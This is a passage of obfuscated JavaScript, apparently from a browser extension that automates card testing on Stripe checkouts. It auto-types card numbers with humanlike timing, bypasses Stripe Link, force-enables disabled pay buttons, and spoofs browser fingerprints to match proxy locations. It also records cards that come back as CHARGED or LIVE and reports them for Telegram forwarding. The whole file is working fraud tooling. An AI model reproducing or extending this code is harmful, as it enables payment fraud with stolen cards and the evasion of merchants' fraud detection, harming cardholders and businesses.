      _0xel.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: _0xch, code: _0xcode }));
      _0xel.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: _0xch, code: _0xcode }));
      _0xcur += _0xch;
      if (_0xset) { _0xset.call(_0xel, _0xcur); } else { _0xel.value = _0xcur; }
      try {
        _0xel.dispatchEvent(new InputEvent("input", { bubbles: true, cancelable: true, inputType: "insertText", data: _0xch }));
      } catch (_eI) { _0xel.dispatchEvent(new Event("input", { bubbles: true, cancelable: true })); }
      _0xel.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: _0xch, code: _0xcode }));
      // Card digits type slightly slower (matches Jetix's pacing); short fields
      // like CVV/expiry stay fast so total fill time doesn't balloon.
      await sleep(_0xisCard ? 10 + Math.floor(Math.random() * 18) : 4);
    }
    _0xel.dispatchEvent(new Event("change", { bubbles: true, cancelable: true }));
    _0xel.dispatchEvent(new Event("blur", { bubbles: true }));
    _0xel.blur();
    return true;
  } catch (_eT) { return false; }
}
__name(typeFieldHumanlike, "typeFieldHumanlike");
function fillSelect(_0x181a14, _0x2d8718) {
  const _0x1cce98 = String(_0x2d8718).toLowerCase();
  let _0x5a054d = Array.from(_0x181a14.options).find(_0x290f7d => _0x290f7d.value.toLowerCase() === _0x1cce98 || _0x290f7d.text.toLowerCase() === _0x1cce98);
  if (!_0x5a054d) {
    _0x5a054d = Array.from(_0x181a14.options).find(_0xa56025 => _0xa56025.text.toLowerCase().includes(_0x1cce98) || _0xa56025.value.toLowerCase().includes(_0x1cce98));
  }
  if (!_0x5a054d) {
    const _0x287c99 = Array.from(_0x181a14.options).filter(_0x34192a => !_0x34192a.disabled && _0x34192a.value && _0x34192a.value !== "" && !_0x34192a.text.toLowerCase().includes("select"));
    if (_0x287c99.length > 0) {
      _0x5a054d = _0x287c99[Math.floor(Math.random() * _0x287c99.length)];
    }
  }
  if (_0x5a054d) {
    _0x181a14.value = _0x5a054d.value;
    _0x181a14.dispatchEvent(new Event("change", {
      bubbles: true
    }));
    _0x181a14.dispatchEvent(new Event("input", {
      bubbles: true
    }));
  }
}
__name(fillSelect, "fillSelect");
async function clickPayWithoutLinkButton() {
  try {
    // Poll for up to 2500ms — Link's overlay typically appears 500ms-1.5s after
    // the page renders (lazy JS evaluation + credential lookup). A single
    // synchronous attempt misses it on fast machines where the fill starts
    // before the overlay DOM node exists.
    const _semexPwlMax = 2500;
    const _semexPwlStep = 200;
    let _semexPwlElapsed = 0;
    while (true) {
      let _0x1f06e7 = null;
      // 1. Class / testid selectors — most stable across Link UI versions.
      _0x1f06e7 =
        document.querySelector("button.LinkCancelPartialLoginButton") ||
        document.querySelector("button[class*='LinkCancelPartialLoginButton']") ||
        document.querySelector("[data-testid='cancel-link-authentication']") ||
        document.querySelector("[data-testid='pay-without-link']") ||
        document.querySelector("[data-testid='link-cancel']");
      // 2. Text scan across all buttons.
      if (!_0x1f06e7) {
        const _0x28dfbd = document.querySelectorAll("button");
        for (const _0x133caa of _0x28dfbd) {
          const _0x3ad2d7 = (_0x133caa.textContent || _0x133caa.innerText || "").toLowerCase();
          if (_0x3ad2d7.includes("pay without link") || _0x3ad2d7.includes("use a different") && _0x3ad2d7.includes("card")) {
            _0x1f06e7 = _0x133caa;
            break;
          }
        }
      }
      // 3. LinkText span fallback (old Link UI wraps text in a <span class="LinkText">).
      if (!_0x1f06e7) {
        const _0xe70c23 = document.querySelectorAll("span.LinkText");
        for (const _0x46224f of _0xe70c23) {
          const _0x3df3d5 = (_0x46224f.textContent || _0x46224f.innerText || "").toLowerCase();
          if (_0x3df3d5.includes("pay without link")) {
            _0x1f06e7 = _0x46224f.closest("button");
            if (_0x1f06e7) break;
          }
        }
      }
      if (_0x1f06e7) {
        _0x1f06e7.click();
        await sleep(500);
        return true;
      }
      if (_semexPwlElapsed >= _semexPwlMax) break;
      await sleep(_semexPwlStep);
      _semexPwlElapsed += _semexPwlStep;
    }
    return false;
  } catch (_0x4f4b9a) {
    return false;
  }
}
__name(clickPayWithoutLinkButton, "clickPayWithoutLinkButton");
// Detects and dismisses the Stripe Link "Use a different card" / saved-payment
// UI that Stripe Link surfaces when it auto-fills a returning user's saved card.
// When active, the card number/expiry/CVC inputs are hidden (Stripe replaces them
// with a summary row), so any fill attempt silently targets invisible elements.
// We click the "Use a different card" / "Change" button to reveal the blank card
// fields before the normal fill runs.  Falls back gracefully — no throw — when
// the Link UI isn't present.
async function dismissStripeLinkSavedPayment() {
  try {
    let _semexChangeBtn = null;
    // 1. Preferred: Stripe's own data-testid attributes (stable across Link UI versions).
    const _semexLinkTestIds = [
      "[data-testid='link-change-payment-method']",
      "[data-testid='link-change-payment']",
      "[data-testid='change-payment-method']",
      "[data-testid='link-use-different-card']",
    ];
    for (const _sel of _semexLinkTestIds) {
      try {
        const _el = document.querySelector(_sel);
        if (_el) { _semexChangeBtn = _el; break; }
      } catch (_e) {}
    }
    // 2. Text-based fallback: only attempt when at least one card-number input
    //    is confirmed HIDDEN (type="hidden", display:none, or visibility:hidden).
    //    A hidden card input means Stripe Link has replaced the card form with its
    //    saved-payment UI.  If no hidden card inputs are found — either because
    //    there is no Stripe form on this page at all, or all fields are still
    //    visible — we skip the text match entirely to avoid spurious clicks on
    //    unrelated merchant buttons like "Change address", "Change plan", or
    //    "Use a different shipping method".
    if (!_semexChangeBtn) {
      const _semexCardNumSels = [
        "#Field-numberInput", "#cardNumber",
        "[data-elements-stable-field-name='cardNumber']",
        "input[autocomplete='cc-number']",
      ];
      let _semexHiddenCardFound = false;
      // querySelectorAll per selector so that a visible input earlier in the DOM
      // cannot mask a hidden sibling that matches the same or a later selector.
      for (const _s of _semexCardNumSels) {
        if (_semexHiddenCardFound) break;
        try {
          const _els = document.querySelectorAll(_s);
          for (let _i = 0; _i < _els.length; _i++) {
            const _el = _els[_i];
            try {
              // type="hidden" — Stripe Link's most common hiding strategy.
              if (_el.type === "hidden") { _semexHiddenCardFound = true; break; }
              // CSS-hidden: display:none or visibility:hidden applied by Stripe
              // Link's animation layer when it swaps in the saved-payment summary.
              try {
                const _cs = window.getComputedStyle(_el);
                if (_cs.display === "none" || _cs.visibility === "hidden") {
                  _semexHiddenCardFound = true; break;
                }
              } catch (_ce) {}
            } catch (_ee) {}
          }
        } catch (_e) {}
      }
      // Only proceed when Stripe Link's hidden card UI is positively confirmed.
      // If no hidden card inputs were found, bail out — the page either has no
      // Stripe form or the card form is fully visible, so text-matching is unsafe.
      if (_semexHiddenCardFound) {
        // Restricted to Stripe Link-specific copy phrases.
        // MUST NOT match: "different shipping", "different delivery",
        // "Change address", "Change plan", "Change subscription", or
        // bare "different" — all common merchant-page controls.
        const _semexBtns = document.querySelectorAll("button, [role='button']");
        for (const _b of _semexBtns) {
          const _t = (_b.textContent || _b.innerText || "").toLowerCase().trim();
          if (
            _t.includes("different card") ||
            _t.includes("different payment method") ||
            _t.includes("different payment") ||
            _t.includes("other card") ||
            _t === "change" ||
            _t === "change card" ||
            _t === "change payment method" ||
            _t === "change payment"
          ) {
            _semexChangeBtn = _b;
            break;
          }
        }
      }
    }
    if (!_semexChangeBtn) return false;
    _semexChangeBtn.click();
    // Give Stripe Link's animation time to complete and reveal the card inputs.
    await sleep(600);
    return true;
  } catch (_e) {
    return false;
  }
}
__name(dismissStripeLinkSavedPayment, "dismissStripeLinkSavedPayment");
async function triggerStripeValidation() {
  await sleep(500);
  // Wallet/express-payment button detector — these buttons sit above the card
  // form on Stripe hosted checkout (Apple Pay, Link, Amazon Pay, Google Pay,
  // CashApp Pay, etc.) and their text often contains "pay" which would match
  // before the real card-submit button in any text-based scan.
  const _semexIsWalletBtn = function(_b) {
    // Strip emojis/symbols then normalise whitespace so "⚡ Link" → "link"
    const _t = (_b.textContent || _b.innerText || "")
      .replace(/[\u{1F300}-\u{1FFFF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu, "")
      .toLowerCase().replace(/\s+/g, " ").trim();
    const _cls = (typeof _b.className === "string" ? _b.className : "").toLowerCase();
    const _aid = (_b.getAttribute("aria-label") || "")
      .replace(/[\u{1F300}-\u{1FFFF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu, "")
      .toLowerCase().replace(/\s+/g, " ").trim();
    const _wallets = [
      "apple pay", "google pay", "amazon pay", "amazon", "link",
      "cashapp pay", "cash app pay", "alipay", "klarna", "afterpay",
      "affirm", "paypal", "wechat pay", "revolut pay", "pay by bank",
      "sepa debit", "ideal", "sofort", "bancontact", "giropay", "eps",
      "przelewy24", "boleto", "konbini", "fpx", "blik", "multibanco"
    ];
    // Contains-match (not exact) so emoji-prefixed labels like "⚡ Link" are caught
    if (_wallets.some(function(w) { return _t === w || _t.includes(w) || _aid === w || _aid.includes(w); })) return true;
    // Class-name pattern: Stripe renders wallet buttons with recognisable class fragments
    if (/apple.?pay|google.?pay|amazon.?pay|paypal|alipay|klarna|afterpay|walletbtn|wallet.button|express.button|\blink\b/i.test(_cls)) return true;
    return false;
  };

  // Pass 1 — attribute / class selectors covering old UI and new habanero UI.
  // New Stripe checkout (/g/pay/) uses data-testid="pay-button"; the old
  // hosted checkout uses "hosted-payments-submit-button". p-Button--primary
  // is the new-UI primary action button fallback.
  let _0x82575b = document.querySelector(
    "button[data-testid=\"hosted-payments-submit-button\"]," +
    "button[data-testid=\"pay-button\"]," +
    "button[data-testid=\"payment-submit-button\"]," +
    "button[data-testid=\"confirm-payment-button\"]," +
    "button[data-testid=\"submit\"]," +
    "button[id*=\"submit\"]," +
    "button[class*=\"Submit\"]," +
    "button[class*=\"submit\"]"
  );
  // type="submit" is checked separately AFTER the specific selectors because
  // wallet buttons on Stripe hosted checkout also use type="submit" and appear
  // earlier in DOM order than the actual card-submit button.
  if (!_0x82575b) {
    const _semexSubmitTypeBtns = Array.from(document.querySelectorAll("button[type=\"submit\"]"));
    _0x82575b = _semexSubmitTypeBtns.find(function(_b) { return !_semexIsWalletBtn(_b); }) || null;
  }
  // Nullify if wallet button slipped through the specific selectors.
  if (_0x82575b && _semexIsWalletBtn(_0x82575b)) _0x82575b = null;

  // Pass 2 — SubmitButton component wrapper (old UI) or p-Button--primary (new UI).
  // p-Button--primary is checked LAST within this pass because Stripe also assigns it
  // to wallet buttons (Link, Apple Pay) that appear before the card-submit button in DOM.
  if (!_0x82575b) {
    const _semexSubmitWrapper = document.querySelector("[class*=\"SubmitButton\"]:not([class*=\"Icon\"])");
    if (_semexSubmitWrapper && !_semexIsWalletBtn(_semexSubmitWrapper)) {
      _0x82575b = _semexSubmitWrapper.closest("button") || _semexSubmitWrapper.querySelector("button") || _semexSubmitWrapper;
    }
  }
  // Pass 2b — invoice.stripe.com hosted invoice pages label the submit button
  // "Pay" / "Pay $25.00" / "Pay ₹1,000" with generic classes (Pixel Zero
  // invoice flow). Text-match is gated to the invoice host so it never fires
  // on arbitrary pages.
  if (!_0x82575b && /(^|\.)invoice\.stripe\.com$/i.test(location.hostname)) {
    _0x82575b = Array.from(document.querySelectorAll("button, [role=\"button\"]")).find(function(_b) {
      try {
        if (_b.disabled || _b.getAttribute("aria-disabled") === "true") return false;
        const _r = _b.getBoundingClientRect();
        if (!_r || _r.width < 10 || _r.height < 10) return false;
        const _t = (_b.textContent || "").replace(/\s+/g, " ").trim();
        return /^pay\b/i.test(_t) && !_semexIsWalletBtn(_b);
      } catch (_eIB) { return false; }
    }) || null;
  }
  if (!_0x82575b) {
    // p-Button--primary: pick the LAST one in DOM order — the card-submit button
    // is always rendered after the wallet buttons (Apple Pay, Link, etc.) on Stripe.
    const _semexPrimaryBtns = Array.from(document.querySelectorAll("button.p-Button--primary"))
      .filter(function(_b) { return !_semexIsWalletBtn(_b); });
    if (_semexPrimaryBtns.length) _0x82575b = _semexPrimaryBtns[_semexPrimaryBtns.length - 1];
  }
  if (_0x82575b && _semexIsWalletBtn(_0x82575b)) _0x82575b = null;
  // Pass 3 — text / aria-label scan for pay / subscribe / donate / confirm / complete.
  // Wallet buttons are explicitly excluded so "Apple Pay" / "Amazon Pay" etc.
  // are never mistaken for the card-submit button.
  if (!_0x82575b) {
    const _0x2df074 = ["pay", "subscribe", "donate", "confirm", "complete"];
    _0x82575b = Array.from(document.querySelectorAll("button, [role=\"button\"]")).find(_0x3d53a2 => {
      if (_semexIsWalletBtn(_0x3d53a2)) return false;
      const _0x1deb50 = (_0x3d53a2.textContent || "").toLowerCase().trim();
      const _0x5a2282 = (_0x3d53a2.getAttribute("aria-label") || "").toLowerCase();
      return _0x2df074.some(_0x56ef8f => _0x1deb50.includes(_0x56ef8f) || _0x5a2282.includes(_0x56ef8f));
    });
  }
  if (_0x82575b) {
    const _0x48e618 = __name(() => {
      const _0x303df1 = _0x82575b.getAttribute("aria-disabled");
      const _0x303df2 = _0x82575b.getAttribute("aria-busy");
      return (
        _0x82575b.disabled ||
        _0x303df1 === "true" ||
        _0x303df2 === "true" ||
        _0x82575b.classList.contains("SubmitButton--incomplete") ||
        _0x82575b.classList.contains("SubmitButton--disabled") ||
        _0x82575b.classList.contains("p-Button--loading")
      );
    }, "isButtonDisabled");
    if (_0x48e618()) {
      for (let _0x13fc40 = 0; _0x13fc40 < 50; _0x13fc40++) {
        await sleep(100);
        if (!_0x48e618()) {
          break;
        }
      }
      if (_0x48e618()) {
        _0x82575b.disabled = false;
        _0x82575b.removeAttribute("aria-disabled");
        _0x82575b.removeAttribute("aria-busy");
        _0x82575b.classList.remove(
          "SubmitButton--incomplete",
          "SubmitButton--disabled",
          "p-Button--loading"
        );
      }
    }
    _0x82575b.click();
    await sleep(100);
    return true;
  } else {
    return false;
  }
}
__name(triggerStripeValidation, "triggerStripeValidation");
function waitForElement(_0x55c0e4, _0x29a618 = 3000) {
  // Guard: a falsy/undefined selector means the caller has no selector for this
  // field. Without this, waitForElement(undefined, 5000) waits the full timeout
  // (querySelector coerces undefined → "undefined" — a valid but never-matching
  // selector) — a 5-second hidden tax on every merchant-embedded Stripe fill
  // where canonical selectors have no "country" key.
  if (!_0x55c0e4) return Promise.resolve(null);
  return new Promise(_0xcc9afc => {
    const _semexProbe = () => (typeof _semexDeepQuery === "function" ? _semexDeepQuery(_0x55c0e4) : document.querySelector(_0x55c0e4));
    const _semexFirst = _semexProbe();
    if (_semexFirst) {
      return _0xcc9afc(_semexFirst);
    }
    const _0x10f45c = new MutationObserver(_0x241a19 => {
      const _hit = _semexProbe();
      if (_hit) {
        _0xcc9afc(_hit);
        _0x10f45c.disconnect();
      }
    });
    _0x10f45c.observe(document.body, {
      childList: true,
      subtree: true
    });
    // A field mounted inside an EXISTING shadow root mutates that root, not
    // document.body, so the observer above never fires for it. Poll on a light
    // interval alongside the observer to catch late shadow-DOM mounts.
    const _semexPoll = setInterval(() => {
      const _hit = _semexProbe();
      if (_hit) {
        clearInterval(_semexPoll);
        _0x10f45c.disconnect();
        _0xcc9afc(_hit);
      }
    }, 250);
    setTimeout(() => {
      clearInterval(_semexPoll);
      _0x10f45c.disconnect();
      _0xcc9afc(null);
    }, _0x29a618);
  });
}
__name(waitForElement, "waitForElement");
window.addEventListener("message", _0x26a301 => {
  if (_0x26a301.source !== window) {
    return;
  }
  if (_0x26a301.data && _0x26a301.data.type === "STRIPE_CHECKOUT_DETECTED") {
    safeSendMessage({
      type: "INJECT_OVERLAY",
      url: _0x26a301.data.url
    });
  }
});
/* Embedded Stripe Payment Element on a merchant page (inbill-style "Load
   form" flows): no checkout-session response ever hits the top page, so the
   interceptor's STRIPE_CHECKOUT_DETECTED never fires and the overlay would
   never appear there. Watch for a js.stripe.com iframe instead — including
   late insertions after user interaction — and ask the background to inject
   the overlay into THIS top frame. One-shot per page; skipped when the
   overlay is already live (manifest-injected gateway hosts). */
(function _semexWatchEmbeddedStripe() {
  try {
    if (window.top !== window) return;
    let _semexInjectAsked = false;
    const _semexOverlayLive = () => {
      try {
        const _r = document.getElementById("semex-overlay");
        return !!(_r && _r.hasAttribute("data-semex-live"));
      } catch (_e) { return false; }
    };
    const _semexHasStripeFrame = () => {
      try {
        // Require a REAL Stripe payment/card Element (its iframe src contains
        // "elements-inner") OR Stripe Embedded Checkout ("embedded-checkout-inner").
        // Merely loading Stripe.js injects a hidden controller frame
        // (js.stripe.com/v3/controller-*) on ANY site — Replit, dashboards,
        // blogs — which previously popped the overlay on pages with no checkout.
        return Array.from(document.querySelectorAll("iframe")).some(function(_f){
          const _src = _f.src || "";
          return _src.includes("js.stripe.com") && (
            _src.includes("elements-inner") || _src.includes("embedded-checkout-inner")
          );
        });
      } catch (_e) { return false; }
    };
    const _semexMaybeInject = () => {
      try {
        if (_semexInjectAsked || _semexOverlayLive() || !_semexHasStripeFrame()) return;
        _semexInjectAsked = true;
        safeSendMessage({ type: "INJECT_OVERLAY", url: window.location.href });
      } catch (_e) {}
    };
    _semexMaybeInject();
    if (_semexInjectAsked) return;
    // Cheap observer: only react when an iframe (or a subtree containing one)
    // is added — never scans the DOM on unrelated mutations.
    const _semexMo = new MutationObserver(_0xmuts => {
      try {
        for (const _0xm of _0xmuts) {
          // Watch for src attribute changes on existing iframes: Stripe often
          // inserts a blank iframe first and sets the real elements-inner src
          // later — the childList mutation fires with src="" (no match), then
          // an attribute mutation fires when the Stripe URL lands. Without this,
          // late-src-assigned iframes were invisible to the observer.
          if (_0xm.type === "attributes" && _0xm.attributeName === "src") {
            if (_0xm.target && _0xm.target.nodeType === 1 && _0xm.target.tagName === "IFRAME") {
              _semexMaybeInject();
            }
            if (_semexInjectAsked) break;
            continue;
          }
          for (const _0xn of _0xm.addedNodes || []) {
            if (_0xn && _0xn.nodeType === 1 && (_0xn.tagName === "IFRAME" || (_0xn.querySelector && _0xn.querySelector("iframe")))) {
              _semexMaybeInject();
              break;
            }
          }
          if (_semexInjectAsked) break;
        }
        if (_semexInjectAsked) _semexMo.disconnect();
      } catch (_e) {}
    });
    _semexMo.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ["src"] });
    // A checkout that never loads shouldn't keep an observer alive forever.
    setTimeout(() => { try { _semexMo.disconnect(); } catch (_e) {} }, 300000);
  } catch (_e) {}
})();
/* Forward stripe.redirectToCheckout intercept → background tab opener. */
window.addEventListener("message", function _semexCheckoutTabBridge(ev) {
  if (!ev || ev.source !== window || !ev.data) return;
  if (ev.data.type !== "SEMEX_OPEN_CHECKOUT_TAB") return;
  try {
    const _url = String(ev.data.url || "");
    if (_url.startsWith("https://checkout.stripe.com/")) {
      chrome.runtime.sendMessage({ type: "SEMEX_OPEN_CHECKOUT_TAB", url: _url }, function () {
        // Ack back to the MAIN-world interceptor so its failsafe timer knows
        // the background received the request (otherwise it falls back to the
        // merchant's own redirect instead of leaving the page frozen).
        try { window.postMessage({ type: "SEMEX_CHECKOUT_TAB_ACK", url: _url }, "*"); } catch (_e) {}
      });
    }
  } catch (_e) {}
});
/* ==================== SEMEX ANTI-FINGERPRINT BRIDGE ==================== */
(function semexAFBridge() {
  const DEFAULT_AF = {
    enabled: true,
    canvas: true,
    webgl: true,
    audio: true,
    navigator: true,
    timezone: true,
    webrtc: true,
    ua: null,
    platform: null,
    language: null,
    languages: null,
    timezoneName: null,
    timezoneOffset: null,
  };

  // Curated realistic UA/platform/timezone presets keyed by proxy geo. When
  // proxy country isn't known, "auto" leaves navigator alone so nothing suspicious
  // gets sent. Add more presets over time as needed.
  const PRESETS = {
    US: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "en-US", languages: ["en-US","en"], timezoneName: "America/New_York", timezoneOffset: 300 },
    UK: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "en-GB", languages: ["en-GB","en"], timezoneName: "Europe/London", timezoneOffset: 0 },
    IN: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "en-IN", languages: ["en-IN","en"], timezoneName: "Asia/Kolkata", timezoneOffset: -330 },
    DE: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "de-DE", languages: ["de-DE","de","en"], timezoneName: "Europe/Berlin", timezoneOffset: -60 },
    FR: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "fr-FR", languages: ["fr-FR","fr","en"], timezoneName: "Europe/Paris", timezoneOffset: -60 },
    CA: { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15", platform: "MacIntel", language: "en-CA", languages: ["en-CA","en","fr-CA"], timezoneName: "America/Toronto", timezoneOffset: 300 },
    AU: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "en-AU", languages: ["en-AU","en"], timezoneName: "Australia/Sydney", timezoneOffset: -600 },
    JP: { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15", platform: "MacIntel", language: "ja-JP", languages: ["ja-JP","ja","en"], timezoneName: "Asia/Tokyo", timezoneOffset: -540 },
    BR: { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", platform: "Win32", language: "pt-BR", languages: ["pt-BR","pt","en"], timezoneName: "America/Sao_Paulo", timezoneOffset: 180 },
  };

  function push(state) {
    try { window.postMessage({ __semex: "af", type: "set-state", state }, "*"); } catch (e) {}
  }
  function bump() {
    try { window.postMessage({ __semex: "af", type: "bump" }, "*"); } catch (e) {}
  }
  window.__SEMEX_AF_BUMP__ = bump; // expose for overlay Start / retry

  async function loadAndPush() {
    try {
      const r = await new Promise((res) => chrome.storage.local.get(["antiFingerprint","currentProxyGeo"], res));
      const cfg = Object.assign({}, DEFAULT_AF, r.antiFingerprint || {});
      const geo = (r.currentProxyGeo && String(r.currentProxyGeo).toUpperCase()) || null;
      if (geo && PRESETS[geo]) {
        Object.assign(cfg, PRESETS[geo]);
      }
      push(cfg);
    } catch (e) { /* ignore */ }
  }

  // Push when the MAIN world script announces it booted, and any time settings change.
  window.addEventListener("message", (ev) => {
    if (ev && ev.data && ev.data.__semex === "af" && ev.data.type === "ready") loadAndPush();
  });
  try {
    chrome.storage.onChanged.addListener((changes, area) => {
      if (area !== "local") return;
      if (changes.antiFingerprint || changes.currentProxyGeo) loadAndPush();
    });
  } catch (e) {}
  loadAndPush();
})();

/* Forward MV3-service-worker fingerprint bump requests into the MAIN world. */
try {
  chrome.runtime.onMessage.addListener((msg) => {
    if (msg && msg.type === "SEMEX_AF_BUMP" && typeof window.__SEMEX_AF_BUMP__ === "function") {
      window.__SEMEX_AF_BUMP__();
    }
  });
} catch (e) {}

/* v2.8.8 — surface proxy fail-open events to the user. The background sends
   SEMEX_PROXY_FAILOVER both for page-load failover (main_frame) and the new
   submit-time failover (api.stripe.com XHR). Previously NOTHING listened to
   this message, so the warning never appeared. */
try {
  chrome.runtime.onMessage.addListener((msg) => {
    if (!msg || msg.type !== "SEMEX_PROXY_FAILOVER") return;
    try {
      if (typeof window.showToastV2 === "function") {
        window.showToastV2({
          type: "warning",
          title: "Proxy Failover",
          subtitle: msg.message || "Proxy couldn't reach Stripe — switched to direct connection.",
          duration: 8000
        });
      }
    } catch (e) {}
    try { console.warn("[SEMEX] proxy failover:", msg.host, msg.message); } catch (e) {}
  });
} catch (e) {}

/* Overlay (MAIN world) → background bridge for AF actions. */
window.addEventListener("message", (ev) => {
  if (!ev || !ev.data || ev.source !== window) return;
  const d = ev.data;
  if (d.type === "SEMEX_CLEAR_CHECKOUT_DATA_REQ") {
    try {
      chrome.runtime.sendMessage({ type: "SEMEX_CLEAR_CHECKOUT_DATA", origin: d.origin }, (resp) => {
        window.postMessage({ type: "SEMEX_CLEAR_CHECKOUT_DATA_RES", ok: !!(resp && resp.success), origins: resp && resp.origins }, "*");
      });
    } catch (e) {}
  }
  // confirmCardPayment / confirmPayment / confirmSetup result bridge:
  // interceptor.js (MAIN world) fires these; forward to background for logging.
  if (d.type === "SEMEX_STRIPE_CONFIRM_RESULT" || d.type === "SEMEX_STRIPE_CONFIRM_ERROR" || d.type === "SEMEX_STRIPE_CONFIRM_START") {
    try { chrome.runtime.sendMessage({ type: d.type, method: d.method, status: d.status, id: d.id, message: d.message }); } catch (_eCR) {}
  }
});

/* ============================================================
 * SEMEX_STRIPE_CONFIRM_HIT — inbuilt Payment Element hit path
 * ============================================================
 * Background sends this when it receives SEMEX_STRIPE_CONFIRM_RESULT
 * (confirmCardPayment/confirmPayment resolved) AND a card was filled
 * on this tab recently. Convert to PAYMENT_RESULT so the full hit
 * pipeline (dedup, screenshot, Telegram forward) processes it.
 *
 * This is the safety-net path: the primary path is the network
 * interceptor detecting the Stripe API response in the iframe. If
 * both fire, the 12-second dedup window in background.js drops the
 * duplicate cleanly — no double-hit ever reaches Telegram.
 * ============================================================ */
chrome.runtime.onMessage.addListener(function(_semexConfHit, _semexConfSender, _semexConfResp) {
  if (!_semexConfHit || _semexConfHit.type !== "SEMEX_STRIPE_CONFIRM_HIT") return false;
  // Must run in the top frame only — subframes should never relay this.
  if (window !== window.top) return false;

  const _chCard = _semexConfHit.card || lastFilledCard || window.__LAST_CAPTURED_CARD || null;
  if (!_chCard) return false;

  const _chStatus = _semexConfHit.status;

  // Play the hit sound immediately so the user gets instant feedback.
  if (_chStatus === "CHARGED" || _chStatus === "LIVE" || _chStatus === "CCN_LIVE") {
    try { playSuccessSound(_chStatus); } catch (_eSnd) {}
  }

  // Send through the full PAYMENT_RESULT pipeline in background.js.
  // The FALSE-CHARGED GUARD in background requires both a card AND a
  // recent fill — both are satisfied here (card came from background's
  // own card cache, fill window was set when RELAY_CARD_DATA fired).
  try {
    if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage({
        type: "PAYMENT_RESULT",
        status: _chStatus,
        card: _chCard,
        details: {
          gateway:   "stripe_inbuilt",
          url:       window.location.href,
          siteUrl:   window.location.href,
          hostname:  window.location.hostname,
          intentId:  _semexConfHit.intentId || null,
          method:    _semexConfHit.method   || null
        }
      }).catch(() => {});
    }
  } catch (_eCH) {}
  return false;
});
